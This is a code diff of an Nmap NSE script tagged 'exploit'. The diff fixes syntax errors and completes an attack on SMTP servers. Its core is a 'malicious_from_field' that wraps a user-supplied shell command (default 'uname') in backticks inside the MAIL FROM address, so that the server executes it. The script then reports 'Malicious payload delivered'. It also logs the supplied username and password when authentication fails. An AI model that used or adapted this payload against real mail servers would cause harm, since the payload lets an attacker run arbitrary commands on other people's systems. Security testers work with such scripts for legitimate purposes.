@@ -15,10 +15,13 @@ author = "Paulino Calderon <calderon@websec.mx>"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"exploit"}
 
+local smtp = require "smtp"
+local shortport = require "shortport"
+local stdnse = require "stdnse"
+
 portrule = shortport.port_or_service({25, 465, 587},
                 {"smtp", "smtps", "submission"})
 
-local "smtp" = require "smtp"
 
 action = function(host, port)
   local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname"
@@ -29,8 +32,8 @@ action = function(host, port)
   local user = stdnse.get_script_args(SCRIPT_NAME..".user") or nil
   local pwd = stdnse.get_script_args(SCRIPT_NAME..".pwd") or nil
   local from = stdnse.get_script_args(SCRIPT_NAME..".from") or "nmap@nmap.org"
-  local to = stdnse.get_script_args(SCRIPT_NAME..".to" or "nmap@mailinator.com"
-  local conn_timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout" or 8000 
+  local to = stdnse.get_script_args(SCRIPT_NAME..".to") or "nmap@mailinator.com"
+  local conn_timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 8000 
   local smtp_domain = stdnse.get_script_args(SCRIPT_NAME..".domain") or smtp.get_domain(host)
 
   local smtp_opts = {
@@ -44,23 +47,37 @@ action = function(host, port)
     auth_mech = { auth_mech }
   end
 
-  if auth_mech ~= nil then
+  if (user and pwd) then
     stdnse.print_debug(1, "%s:Mail server requires authentication.", SCRIPT_NAME)
-    for i, mech in ipairs(auth_mech) then
+    for i, mech in ipairs(auth_mech) do
       stdnse.print_debug(1, "Trying to authenticate using the method:%s", mech)
       status, resp = smtp.login(smtp_conn, user, pwd, mech)
       if status then
         break
       end
     end
+    if not(status) then
+      stdnse.print_debug(1, "%s:Authentication failed using user '%s' and password '%s'", SCRIPT_NAME, user, pwd)
+      return nil
+    end
   end
 
-  --Connection was not succesful?
+  local malicious_from_field = "nma`"..cmd.."`p@insecure.org"
+ status, resp = smtp.mail(smtp_conn, malicious_from_field)
   if not(status) then
-    return nil
+    stdnse.print_debug(1, "%s:Payload failed:%s", SCRIPT_NAME, resp)
+    return "Failed"
   end
   status, resp = smtp.recipient(smtp_conn, to)
+  if not(status) then
+    stdnse.print_debug(1, "%s:Cannot set recipient:%s", SCRIPT_NAME, resp)
+    return nil
+  end
 
-  status, resp = smtp.mail()
-  smtp.quit(smtp_conn)
-end
+  status, resp = smtp.datasend(smtp_conn, "nse")
+  if status then
+    return string.format("Malicious payload delivered:%s", resp)
+  else
+    stdnse.print_debug(1, "Payload could not be delivered:%s", resp) 
+  end
+ end
